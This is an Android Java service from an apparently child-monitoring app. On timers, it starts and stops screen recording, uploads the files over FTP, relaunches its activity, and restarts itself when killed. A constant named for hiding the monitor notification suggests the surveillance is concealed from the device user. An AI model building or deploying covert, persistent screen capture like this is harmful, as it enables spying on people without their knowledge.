package com.alack.supervisekinder.daemon;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.annotation.Nullable;

import com.alack.supervisekinder.FTPService;
import com.alack.supervisekinder.KinderApplication;
import com.alack.supervisekinder.RecorderService;
import com.alack.supervisekinder.utils.Const;
import com.alack.supervisekinder.utils.LogManager;

import java.util.ArrayList;

/**
 * Created by Administrator on 2017/3/8.
 */

public class MonitorService extends Service {

    private static final String     TAG         = "MonitorService";
    private LogManager              Log         = LogManager.getInstance();

    @SuppressWarnings("FieldCanBeLocal")
    private static long             UPCOUNT     = 0;
    @SuppressWarnings("FieldCanBeLocal")
    private boolean                 bForeground = true;

    private ArrayList<Task> mTasklist   = new ArrayList<>();
    Context                 This_       = this;



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "onCreate()...thread id :" + Thread.currentThread().getId());

        initTaskList();

        // task thread
        new Thread(new TaskThread()).start();

        KinderApplication.getInstance().addService(this);
        startForeGround(false);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand() intent action: " + intent.getAction() + ", flags: " + flags);
        //flags = START_STICKY;
        //return super.onStartCommand(intent, flags, startId);

        return START_STICKY; // auto rerun
    }

    @Override
    public void onDestroy() {
        //super.onDestroy();
        Log.d(TAG, "onDestroy() count:" + UPCOUNT);
        //Intent lIntent = new Intent(this, MonitorService.class);
        //this.startService(lIntent);
    }


    private static final int TASK_SCREENRECORD_FIRST    = 0;
    private static final int TASK_SCREENRECORD_START    = 1;
    private static final int TASK_SCREENRECORD_STOP     = 2;
    private static final int TASK_FILE_FTPUPLOAD        = 3;
    private static final int TASK_SCREENRECORD_END      = 4;

    private int             task_product                = 1;
    @SuppressWarnings("FieldCanBeLocal")
    private boolean         taskRunning                 = true;

    public interface TaskInterface {
        void run(String action);
    }
    public class Task {
        private int         item;
        private long        interval;
        private String       action;
        private long         last;
        private TaskInterface task;

        public Task(int item, long inter, String action) {
            this.item       = item;
            this.interval   = inter;
            this.action     = action;
            this.last       = -1;
            //Log.e(TAG, "--------------" + this.item + ":" + this.interval + ":" + this.action);
        }

        public void setTask(TaskInterface task) {
            this.task = task;
        }

        public void setLast(long last) {
            this.last = last;
        }

        public void runTask() {
            task.run(action);
        }
        public void sync(int index) {
            if(mTasklist.isEmpty())
                return;
            Task t = mTasklist.get(index);
            if(t == null)
                return;
            //Log.e(TAG, "SYNC " + t.action + "(" + t.last + ") to " + this.action + "(" + this.last + ")");
            this.last = t.last;
        }

        public boolean isExecute(long now) {
            if(this.item == TASK_SCREENRECORD_STOP) {
                // sync TASK_SCREENRECORD_START lasttime to TASK_SCREENRECORD_STOP
                //Log.e(TAG, "sync TASK_SCREENRECORD_START lasttime to TASK_SCREENRECORD_STOP");
                this.sync(TASK_SCREENRECORD_START);
            }
            return this.interval * 1000 <= (now - this.last);
        }
    }

    private  void initTaskList() {

        if(!mTasklist.isEmpty())
            return;
        Log.i(TAG, "Init TaskList!!!");

        Task taskA = new Task(TASK_SCREENRECORD_FIRST, 150, Const.getTaskCheckMainactivity());
        taskA.setLast(System.currentTimeMillis());
        taskA.setTask(new TaskInterface() {
            @Override
            public void run(String action) {
                Log.e(TAG, "TaskInterface run...action - " + action);
                // start MainActivity
                KinderApplication.getInstance().notfiyKeeplive((Service)This_, Intent.ACTION_MAIN);
            }
        });
        mTasklist.add(taskA);

        Task taskB = new Task(TASK_SCREENRECORD_START, 120, Const.getScreenRecordingStart());
        taskB.setLast(System.currentTimeMillis() - (taskB.interval*1000) - 30);// MainActivity already run First - (taskB.interval*1000) - 30); //First RUN
        taskB.setTask(new TaskInterface() {
            @Override
            public void run(String action) {
                Log.e(TAG, "TaskInterface run...action - " + action);
                Intent recIntent = new Intent(This_, RecorderService.class);
                recIntent.setAction(action);
                This_.startService(recIntent);
            }
        });
        mTasklist.add(taskB);

        Task taskC = new Task(TASK_SCREENRECORD_STOP, taskB.interval, Const.getScreenRecordingStop());
        taskC.interval = taskC.interval - 2;
        taskC.setLast(System.currentTimeMillis());
        taskC.setTask(new TaskInterface() {
            @Override
            public void run(String action) {
                Log.e(TAG, "TaskInterface run...action - " + action);
                Intent recIntent = new Intent(This_, RecorderService.class);
                recIntent.setAction(action);
                This_.startService(recIntent);
            }
        });
        mTasklist.add(taskC);
        Task taskD = new Task(TASK_FILE_FTPUPLOAD, 100, Const.getTaskUploadfileStart());
        taskD.setLast(System.currentTimeMillis());
        taskD.setTask(new TaskInterface() {
            @Override
            public void run(String action) {
                Log.e(TAG, "TaskInterface run...action - " + action);
                Intent ftpIntent = new Intent(This_, FTPService.class);
                ftpIntent.setAction(action);
                This_.startService(ftpIntent);
            }
        });
        mTasklist.add(taskD);

        Task taskE = new Task(TASK_SCREENRECORD_END, -1, Const.getTaskEmptyNothing());
        taskE.setLast(System.currentTimeMillis());
        taskE.setTask(new TaskInterface() {
            @Override
            public void run(String action) {
                Log.e(TAG, "TaskInterface run...action - " + action);
            }
        });
        mTasklist.add(taskE);
    }


    final Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {
            if(mTasklist.isEmpty()) {
                Log.i(TAG, "Tasklist Empty,why ???");
            } else {
                Task t = mTasklist.get(msg.what);
                t.runTask();
            }
            return false;
        }
    });

    private long lastTime   = System.currentTimeMillis();

    public class TaskThread implements Runnable {
        @Override
        public void run() {
            while (taskRunning) {
                try {
                    long nowTime = System.currentTimeMillis();
                    long inner = (nowTime - lastTime);
                    Log.d(TAG, "TaskThread running...count " + task_product +
                            ", last time - " + lastTime + ", now " + nowTime + ", diff " + inner + "ms");

                    for(Task t : mTasklist) {
                        if(t.interval == -1 || !t.isExecute(nowTime)) {
                            // Log.d(TAG, "Task not in time, next again...,task " + t.item + " continue...");
                            continue;
                        }
                        long in = nowTime - t.last;
                        Log.d(TAG, "TaskThread running...task - " + t.item +
                                ", last interval time - " + in + "ms");
                        t.last = nowTime;

                        // task
                        Message msg = handler.obtainMessage();
                        msg.what = t.item;
                        handler.sendMessage(msg);

                    }

                    Log.d(TAG, "TaskThread running end..." + task_product);
                    task_product++;

                    Thread.sleep(2000); //inner/2000
                    lastTime = nowTime;
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.e(TAG, "TaskThreaad() - error - " + e.toString());
                }
            }
        }
    }

    private void startForeGround(boolean bFore) {

        if(!bForeground)
            return;

        Log.i(TAG, "startForeGround() :" + bFore);
        KinderApplication.getInstance().notfiyKeeplive(this, Const.getNotificationHideMonitor());
    }

}
